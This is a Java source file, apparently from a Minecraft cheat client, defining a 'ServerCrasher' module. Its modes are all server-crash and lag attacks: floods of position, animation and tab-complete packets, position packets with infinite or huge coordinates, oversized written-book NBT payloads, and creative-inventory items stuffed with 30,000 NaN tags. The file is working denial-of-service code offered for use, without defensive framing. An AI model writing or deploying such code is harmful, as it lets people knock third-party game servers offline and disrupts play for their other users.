package cn.snowflake.rose.mod.mods.WORLD;


import java.util.Random;

import cn.snowflake.rose.events.impl.EventMotion;
import cn.snowflake.rose.events.impl.EventUpdate;
import cn.snowflake.rose.mod.Category;
import cn.snowflake.rose.mod.Module;
import cn.snowflake.rose.utils.ChatUtil;
import cn.snowflake.rose.utils.Value;
import com.darkmagician6.eventapi.EventTarget;


import io.netty.buffer.Unpooled;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.*;

public class ServerCrasher extends Module {
    public Value<String> mode = new Value<String>("ServerCrasher_Mode", "Mode",0);

    private boolean speedTick;
    private double yVal;
    double health;
    boolean hasDamaged = false;
    boolean hasJumped = false;
    double posY = 0.0D;

    public ServerCrasher() {
        super("ServerCrasher", Category.WORLD);
        this.mode.addValue("C0Animotion");
        this.mode.addValue("C14TabComplete");
        this.mode.addValue("AACnew");
        this.mode.addValue("AACold");
        this.mode.addValue("massivechunkloading");
        this.mode.addValue("Slowly");
        this.mode.addValue("Book");
        this.mode.addValue("Gamemode");
        this.mode.addValue("Fly");

    }


    public void onEnable() {
//		if (this.isEnabled()) {
        if (mode.isCurrentMode("AACnew")) {
            for (int index = 0; index < 9999; ++index)
                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + 9412 * index, mc.thePlayer.boundingBox.minY, mc.thePlayer.boundingBox.minY + 9412 * index, mc.thePlayer.posZ + 9412 * index, true));
        }
        if (mode.isCurrentMode("AACold")) {
            mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Double.NEGATIVE_INFINITY, mc.thePlayer.boundingBox.minY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
        }
        if (mode.isCurrentMode("C0Animotion")){
            for (int i = 0; i < (1337 * 5); i++) {
                this.setDisplayName("Packet :" + i);
                mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
            }
        }
        if (mode.isCurrentMode("C14TabComplete")){
            for (int i = 0; i < (1337 * 5); i++) {
                this.setDisplayName("Packet :" + i);
                mc.thePlayer.sendQueue.addToSendQueue(new C14PacketTabComplete("/"));
            }
        }
        if (mode.isCurrentMode("massive_chunkloading")) {
            for (double yPos = mc.thePlayer.posY; yPos < 255; yPos += 5) {
                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX, mc.thePlayer.boundingBox.minY, yPos, mc.thePlayer.posZ, true));
            }
            for (int i = 0; i < (1337 * 5); i += 5) {
                this.setDisplayName("Packet :" + i);
                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + i, mc.thePlayer.boundingBox.minY, 255, mc.thePlayer.posZ + i, true));
            }
        }
//		}
    }

    public void onDisable() {
        this.mc.thePlayer.capabilities.allowFlying = false;
    }

    @EventTarget
    public void OnUpdate(EventUpdate e) {

        if(mode.isCurrentMode("Slowly")) {
            if (this.hasJumped) {
                this.mc.thePlayer.motionY = 0.0D;
            }

            for(int i = 0; i < 50; ++i) {
                if (!(this.hasDamaged = (double)((int)this.mc.thePlayer.getHealth()) < this.health)) {
                    this.damage();
                }

                this.health = (double)this.mc.thePlayer.getHealth();
                if (!this.hasJumped) {
                    this.hasJumped = true;
                    this.mc.thePlayer.motionY = 0.3D;
                }
            }
        }



        if(mode.isCurrentMode("Book")) {
            NetHandlerPlayClient sendQueue = mc.thePlayer.sendQueue;
            try {
                ItemStack bookObj = new ItemStack(Items.written_book);
                String author = "NMSL" + Math.random() * 400.0D;
                String title = "xD" + Math.random() * 400.0D;
                String mm255 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                NBTTagCompound tag = new NBTTagCompound();
                NBTTagList list = new NBTTagList();

                for (int i = 0; i < 50; i++) {
                    String siteContent = mm255;
                    NBTTagString tString = new NBTTagString(siteContent);
                    list.appendTag(tString);
                }

                tag.setString("author", author);
                tag.setString("title", title);
                tag.setTag("pages", list);

                if (bookObj.hasTagCompound()) {
                    NBTTagCompound nbttagcompound = bookObj.getTagCompound();
                    nbttagcompound.setTag("pages", list);
                } else {
                    bookObj.setTagInfo("pages", list);
                }

                String s2 = "MC|BEdit";

                if (new Random().nextBoolean()) {
                    s2 = "MC|BSign";
                }

                bookObj.setTagCompound(tag);
                PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
                packetbuffer.writeItemStackToBuffer(bookObj);
                mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload(s2, packetbuffer));
            } catch (Exception localException) {
            }
        }

        if(mode.isCurrentMode("Gamemode")) {
            if (mc.playerController.isNotCreative()) {
                ChatUtil.sendClientMessage("In order for the crasher to work you have to be in GM 1!");
                return;
            }
            ChatUtil.sendClientMessage("The server should now lag!");
            ItemStack itm = new ItemStack(Blocks.stone);
            String crashText = "";
            NBTTagCompound base = new NBTTagCompound();
            int i3 = 0;
            while (i3 < 30000) {
                base.setDouble(String.valueOf(i3), Double.NaN);
                ++i3;
            }
            itm.setTagCompound(base);
            i3 = 0;

            while (i3 < 40) {
                mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(i3, itm));
                ++i3;
            }
        }

        if(mode.isCurrentMode("Fly")) {
            double x;
            double playerY;
            double y;
            double playerZ;
            double z;
            int i;
            double playerX = mc.thePlayer.posX;
            playerY = mc.thePlayer.posY;
            playerZ = mc.thePlayer.posZ;
            y = 0.0;
            x = 0.0;
            z = 0.0;
            i = 0;

            while (i < 200) {
                y = i * 9;
                mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y,mc.thePlayer.rotationYaw,playerZ, false));
                ++i;
            }

            i = 0;

            while (i < 10000) {
                z = i * 9;
                mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y,mc.thePlayer.rotationYaw,playerZ + z, false));
                ++i;
            }
        }
    }
    @EventTarget
    public void onPreMovePlayer(EventMotion event) {
        if (this.speedTick) {
            event.y *= 1.0E-13D;
            double movementMultiplier = (double)this.mc.thePlayer.capabilities.getFlySpeed() * 20.0D;
            this.mc.thePlayer.fallDistance = 0.0F;
            this.mc.thePlayer.onGround = true;
        }
    }

    private void damage() {
        for(int i = 0; i < 70; ++i) {
            this.mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(this.mc.thePlayer.posX,mc.thePlayer.boundingBox.minY ,this.mc.thePlayer.posY + 0.06D, this.mc.thePlayer.posZ, false));
            this.mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(this.mc.thePlayer.posX, mc.thePlayer.boundingBox.minY ,this.mc.thePlayer.posY, this.mc.thePlayer.posZ, false));
        }
        this.mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(this.mc.thePlayer.posX, mc.thePlayer.boundingBox.minY ,this.mc.thePlayer.posY + 0.1D, this.mc.thePlayer.posZ, false));
    }

}

